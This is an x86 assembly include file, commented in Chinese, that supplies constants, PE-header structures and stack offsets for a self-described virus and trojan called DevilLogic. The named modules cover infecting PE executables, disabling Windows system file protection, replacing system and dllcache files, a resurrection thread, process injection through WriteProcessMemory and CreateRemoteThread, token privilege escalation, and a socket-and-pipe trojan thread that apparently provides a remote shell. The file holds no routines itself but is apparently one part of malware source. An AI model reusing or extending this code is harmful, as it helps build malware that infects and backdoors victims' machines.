;DevilLogic.INC
;系统常量

;===================
MAX_PATH = 128h
INVALID_HANDLE_VALUE = -1
ANYSIZE_ARRAY                        equ 1h
TRUE = 1
FALSE = 0
NULL = 0
INFINITE                             equ -1
;Booter常量;PE文件结构
InfectTarget									equ 3
InfectSign										equ	4
PEHeaderOffset 				 					equ 03Ch
IMAGE_NUMBEROF_DIRECTORY_ENTRIES            	equ 16
IMAGE_SIZEOF_SHORT_NAME 						equ 8

IMAGE_DIRECTORY_ENTRY_EXPORT                	equ  0

IMAGE_DATA_DIRECTORY STRUCT
  VirtualAddress    DWORD      ?
  isize             DWORD      ?
IMAGE_DATA_DIRECTORY ENDS

IMAGE_EXPORT_DIRECTORY STRUCT
  Characteristics           DWORD      ?
  TimeDateStamp             DWORD      ?
  MajorVersion              WORD       ?
  MinorVersion              WORD       ?
  nName                     DWORD      ?
  nBase                     DWORD      ?
  NumberOfFunctions         DWORD      ?
  NumberOfNames             DWORD      ?
  AddressOfFunctions        DWORD      ?
  AddressOfNames            DWORD      ?
  AddressOfNameOrdinals     DWORD      ?
IMAGE_EXPORT_DIRECTORY ENDS

PEHeader 	struc
;IMAGE_NT_HEADERS
  Signature         			DWORD	?
;IMAGE_FILE_HEADER
  Machine               		WORD    ?
  NumberOfSections      		WORD    ?
  TimeDateStamp_Nt_Header        	DWORD   ?
  PointerToSymbolTable  		DWORD   ?
  NumberOfSymbols       		DWORD   ?
  SizeOfOptionalHeader  		WORD    ?
  Characteristics_Nt_Header       	WORD    ?
;IMAGE_OPTIONAL_HEADER32
  Magic                         WORD       ?
  MajorLinkerVersion            BYTE       ?
  MinorLinkerVersion            BYTE       ?
  SizeOfCode                    DWORD      ?
  SizeOfInitializedData         DWORD      ?
  SizeOfUninitializedData       DWORD      ?
  AddressOfEntryPoint           DWORD      ?
  BaseOfCode                    DWORD      ?
  BaseOfData                    DWORD      ?
  ImageBase                     DWORD      ?
  SectionAlignment              DWORD      ?
  FileAlignment                 DWORD      ?
  MajorOperatingSystemVersion   WORD       ?
  MinorOperatingSystemVersion   WORD       ?
  MajorImageVersion             WORD       ?
  MinorImageVersion             WORD       ?
  MajorSubsystemVersion         WORD       ?
  MinorSubsystemVersion         WORD       ?
  Win32VersionValue             DWORD      ?
  SizeOfImage                   DWORD      ?
  SizeOfHeaders                 DWORD      ?
  CheckSum                      DWORD      ?
  Subsystem                     WORD       ?
  DllCharacteristics            WORD       ?
  SizeOfStackReserve            DWORD      ?
  SizeOfStackCommit             DWORD      ?
  SizeOfHeapReserve             DWORD      ?
  SizeOfHeapCommit              DWORD      ?
  LoaderFlags                   DWORD      ?
  NumberOfRvaAndSizes           DWORD      ?
  DataDirectory                 IMAGE_DATA_DIRECTORY IMAGE_NUMBEROF_DIRECTORY_ENTRIES dup(<>)	
PEHeader 	ends

IMAGE_SECTION_HEADER STRUCT
    Name1 							db IMAGE_SIZEOF_SHORT_NAME dup(?)
    VirtualSize 					dd     	?
    VirtualAddress_Section_Header	dd     	?
    SizeOfRawData 					dd     	?
    PointerToRawData 			dd     	?
    PointerToRelocations 		dd 		?
    PointerToLinenumbers 		dd 		?
    NumberOfRelocations 		dw  	?
    NumberOfLinenumbers 		dw  	?
    Characteristics_Section_Header 	dd      ?
IMAGE_SECTION_HEADER ENDS
SECTIONSIZE = size IMAGE_SECTION_HEADER
;===================
;进程相关
SW_HIDE                              	equ 0
STARTF_USESTDHANDLES                 	equ 100h
STARTF_USESHOWWINDOW                 	equ 1h
TH32CS_SNAPPROCESS      				equ 2
PROCESS_QUERY_INFORMATION 	     		equ (0400h)  
TOKEN_QUERY 			     			equ (0008h)
TokenUser                            	equ 1
PROCESS_QUERY_INFORMATION 				equ (0400h)
TOKEN_QUERY 							equ (0008h)
STANDARD_RIGHTS_REQUIRED             equ 0F0000h
SYNCHRONIZE                          equ 100000h	
PROCESS_ALL_ACCESS equ (STANDARD_RIGHTS_REQUIRED + SYNCHRONIZE + 0FFFh)
PROCESSENTRY32 STRUCT
    dwSize              DWORD ?
    cntUsage            DWORD ?
    th32ProcessID       DWORD ?
    th32DefaultHeapID   DWORD ?
    th32ModuleID        DWORD ?
    cntThreads          DWORD ?
    th32ParentProcessID DWORD ?
    pcPriClassBase      DWORD ?
    dwFlags             DWORD ?
    szExeFile           db MAX_PATH dup(?)
PROCESSENTRY32 ENDS		

SECURITY_ATTRIBUTES STRUCT
  nLength              DWORD      ?
  lpSecurityDescriptor  DWORD      ?
  bInheritHandle        DWORD      ?
SECURITY_ATTRIBUTES ENDS

STARTUPINFOA STRUCT
  cb              DWORD ?
  lpReserved      DWORD ?
  lpDesktop       DWORD ?
  lpTitle         DWORD ?
  dwX             DWORD ?
  dwY             DWORD ?
  dwXSize         DWORD ?
  dwYSize         DWORD ?
  dwXCountChars   DWORD ?
  dwYCountChars   DWORD ?
  dwFillAttribute DWORD ?
  dwFlagsSI       DWORD ?
  wShowWindow     WORD ?
  cbReserved2     WORD ?
  lpReserved2     DWORD ?
  hStdInput       DWORD ?
  hStdOutput      DWORD ?
  hStdError       DWORD ?
STARTUPINFOA ENDS

PROCESS_INFORMATION STRUCT
  hProcess      DWORD      ?
  hThread       DWORD      ?
  dwProcessId   DWORD      ?
  dwThreadId    DWORD      ?
PROCESS_INFORMATION ENDS
;===================
;令牌相关
SE_PRIVILEGE_ENABLED                 equ 2h
TOKEN_ADJUST_PRIVILEGES              equ 20h
TOKEN_QUERY 						 equ (0008h)

LUID STRUCT
  LowPart   DWORD      ?
  HighPart  DWORD      ?
LUID ENDS

LUID_AND_ATTRIBUTES STRUCT
    Luid LUID <>
    Attributes dd ?
LUID_AND_ATTRIBUTES ENDS

TOKEN_PRIVILEGES STRUCT
  PrivilegeCount    DWORD      ?
  Privileges        LUID_AND_ATTRIBUTES ANYSIZE_ARRAY dup(<>)
TOKEN_PRIVILEGES ENDS

SID_AND_ATTRIBUTES STRUCT
  Sid           DWORD      ?
  AttributesSID  DWORD      ?
SID_AND_ATTRIBUTES ENDS

TOKEN_USER STRUCT
    User SID_AND_ATTRIBUTES <>
TOKEN_USER ENDS
;===================
;ws2_32.dll
SOCKET                      typedef DWORD
S_UN_B STRUCT
  s_b1 BYTE ?
  s_b2 BYTE ?
  s_b3 BYTE ?
  s_b4 BYTE ?
S_UN_B ENDS

S_UN_W STRUCT 
  s_w1 WORD ?
  s_w2 WORD ?
S_UN_W ENDS

ADDRESS_UNION UNION 
   S_un_b S_UN_B <>
   S_un_w S_UN_W <>
   S_addr DWORD ?
ADDRESS_UNION ENDS

in_addr STRUCT
  S_un ADDRESS_UNION <>
in_addr ENDS

sockaddr_in STRUCT
  sin_family    WORD      ?
  sin_port      WORD      ?
  sin_addr      in_addr <>
  sin_zero      BYTE 8 dup (?)
sockaddr_in ENDS

sockaddr STRUCT
  sa_family     WORD      ?
  sa_data       BYTE 14 dup(?)
sockaddr ENDS

WSADESCRIPTION_LEN          equ 256
WSASYS_STATUS_LEN           equ 128
WSADATA STRUCT
  wVersion      WORD      ?
  wHighVersion  WORD      ?
  szDescription BYTE WSADESCRIPTION_LEN + 1 dup (?)
  szSystemStatus  BYTE WSASYS_STATUS_LEN + 1 dup (?)
  iMaxSockets   WORD      ?
  iMaxUdpDg     WORD      ?
  lpVendorInfo  DWORD      ?
WSADATA ENDS
AF_INET         	 equ        	2
IPPROTO_TCP          equ            6
SOCK_STREAM          equ    		1
INVALID_SOCKET       equ 			NOT 0
;===================
;文件操作相关
OPEN_EXISTING                        equ 3
GENERIC_READ                         equ 80000000h
GENERIC_WRITE                        equ 40000000h
PAGE_READWRITE            			 equ 4
SECTION_MAP_WRITE                    equ 2h
FILE_MAP_WRITE                       equ SECTION_MAP_WRITE
FILE_BEGIN                           equ 0
;===================
;DevilLogic常量
;DevilLogicSize = offset EndDevilLogic - offset DevilLogic
;VirusSize = offset EndVirus - offset StartVirus
;KeyCodeOffset = offset KeyCode - offset DevilLogic
;VirtualAllocOffset = offset VirtualAllocLocal - offset DevilLogic
;ReliveThreadSize = offset EndReliveThread - offset ReliveThread
TrojanThreadSize = offset EndTrojanThread - offset TrojanThread
;StartHeadSize = offset StartVirus - offset DevilLogic

DevilLogicStackSize	= 350h
vRa1 = DevilLogicStackSize
vRa2 = DevilLogicStackSize - 04h
vRa3 = DevilLogicStackSize - 08h
vRa4 = DevilLogicStackSize - 0Ch
vRa5 = DevilLogicStackSize - 10h
vRa6 = DevilLogicStackSize - 14h
vRa7 = DevilLogicStackSize - 18h
vRa8 = DevilLogicStackSize - 1Ch
vRa9 = DevilLogicStackSize - 20h
vRa10 = DevilLogicStackSize - 24h
Eip	= 04h
BaseOffset = 08h
OldEnterAddress = 0Ch
;===================
;获取API地址函数
xLoadLibraryA = 10h
xGetProcAddress = 14h
;advapi32.dll
xLookupPrivilegeValueA = 18h
xOpenThreadToken = 1Ch
xOpenProcessToken = 20h
xGetTokenInformation = 24h
xAdjustTokenPrivileges = 28h
xLookupAccountSidA = 2Ch
;ws2_32.dll
xclosesocket = 30h
xinet_addr = 34h
xrecv = 38h
xsend = 3Ch
xconnect = 40h
xhtons = 44h
xaccept = 48h
xlisten = 4Ch
xsocket = 50h
xWSACleanup = 54h
xWSAStartup = 58h
;kernel32.dll
xCreateFileMappingA = 5Ch
xMapViewOfFile = 60h
xUnmapViewOfFile = 64h
xCloseHandle = 68h
xVirtualAlloc = 6Ch
xVirtualAllocEx = 70h
xOpenProcess = 74h
xWriteProcessMemory = 78h
xCreateRemoteThread = 7Ch
xExitThread = 80h
xCreateToolhelp32Snapshot = 84h
xTerminateProcess = 88h
xPeekNamedPipe = 8Ch
xWriteFile = 90h
xReadFile = 94h
xSleep = 98h
xCreatePipe = 9Ch
xProcess32First = 0A0h
xProcess32Next = 0A4h
xGetCurrentThread = 0A8h
xGetVersion = 0ACh
xWaitForSingleObject = 0B0h
xlstrcatA = 0B4h
xlstrcmpA = 0B8h
xlstrcpyA = 0BCh
xlstrlenA = 0C0h
xCopyFileA = 0C4h
xDeleteFileA = 0C8h
xVirtualFree = 0CCh
xGetSystemDirectoryA = 0D0h
xMoveFileExA = 0D4h
xSetFilePointer = 0D8h
xSetEndOfFile = 0DCh
xGetFileSize = 0E0h
xFlushFileBuffers = 0E4h
xCreateFileA = 0E8h
xGetCurrentProcess = 0ECh
xGetTickCount = 0F0h
xCreateProcessA = 0F4h
xFreeLibrary = 0F8h
xExitProcess = 0FCh
xGetCurrentDirectoryA = 100h
;===================
DevilLogicBaseEbp = 04h
;===================
;取API地址常量
GetApiStackSicze = 10h
;===================
;感染模块常量
InfectStackSize = 34h
szTargetName = 08h
hTargetFile = 0Ch
nTargetSize = 10h
hTargetMap = 14h
pTargetMem = 18h
PeHeader = 1Ch
SecAlign = 20h
FileAlign = 24h
NewEip = 28h
OldEnd = 2Ch
OldEip = 30h
FileImageBase = 34h
;===================
;提升本地进程模块常量
UpgradePopedomProcessStackSize = size TOKEN_PRIVILEGES + 10h
hToken1 = 08h
tp1 = UpgradePopedomProcessStackSize
;===================
;提升本地线程模块常量
UpgradePopedomThreadStackSize = size TOKEN_PRIVILEGES + 10h
hToken2 = 08h
tp2 = UpgradePopedomThreadStackSize
;===================
;取进程所属用户模块常量
ACCOUNTDOMAINSIZE = 100h
INFOBUFFER = 200h
GetProcessUserNameStackSize = INFOBUFFER + 30h
hAccessToken1 = 08h
snu = 0Ch
pId1 = 10h
hRemoteProcess1 = 14h
dwInfoBufferSize = 18h
szAccountName = 1Ch
dwAccountName = 20h
szDomainName = 24h
dwDomainName = 28h
InfoBuf = GetProcessUserNameStackSize 
;===================
;从进程名取进程ID模块常量
GetPidFromProcessNameStackSize = size PROCESSENTRY32 + 10h
szProcessName1 = 08h
hProcessSnap = 0Ch
pe32 = GetPidFromProcessNameStackSize
;===================
;去掉系统文件保护常量
RemoveSystemProtectStackSize = size TOKEN_PRIVILEGES + 20h
InithToken = 08h
hHandle1 = 0Ch
dwVersion = 10h
hSfc = 14h
CloseEvents = 18h
hThread3 = 1Ch
pId2 = 20h
Inittkp = RemoveSystemProtectStackSize
;===================
;替换系统文件常量
ReplaceSystemFileStackSize = 200h
SystemDirectorySize = 100h
TmpFilePathSize = 50h

szFileNamePath = szTmpFilePath - TmpFilePathSize
szTmpFilePath = ReplaceSystemFileStackSize - SystemDirectorySize
szSystemDirectory = ReplaceSystemFileStackSize
;===================
;取的随机数所需常量
GetRandStackSize = 10h
GetRandMax = 08h
GetRandMin = 0Ch
;===================
;替换高速缓冲文件夹中的备份文件
ReplaceDllCacheStackSize = 154h
ReDllCacheStr = ReplaceDllCacheStackSize
FrSystemStr = ReplaceDllCacheStackSize - 75h
;===================
;复活线程常量
ReliveThreadStackSize = 350h
ReliveEip = 04h
ReliveszAccount = ReliveszDomain - 20h
ReliveszDomain = RelivedwRet - 04h
RelivedwRet = RelivehProcessSnap - 04h
RelivehProcessSnap =  ReliveThreadStackSize - size PROCESSENTRY32
Relivepe32 = ReliveThreadStackSize
ReliveszDomain = RelivedwRet - 04h
;===================
;木马线程常量
CommandHeadSize = offset CommandURLHead - offset CommandURL
MURLHeadSize = offset MURLHead - offset MURL
CmdSize = 0FFh
TKey = 99h

TrojanThreadStackSize =0F00h
TBufferSize = 500h
TBuffer1 = TrojanThreadStackSize 
TBuffer2 = TrojanThreadStackSize - TBufferSize

TWSAData = TBuffer2 - TBufferSize
Ts = TWSAData - size WSADATA
Taddr = Ts - 04h
ThReadPipe1 = Taddr - size sockaddr_in
ThWritePipe1 = ThReadPipe1 - 04h
ThWritePipe2 = ThWritePipe1 - 04h
ThReadPipe2 = ThWritePipe2 - 04h

Tsi = ThReadPipe2 - 04h
Tpi = Tsi - size STARTUPINFOA
Tsa = Tpi - size PROCESS_INFORMATION
TTmp = 08h
TEip = 04h
;===================


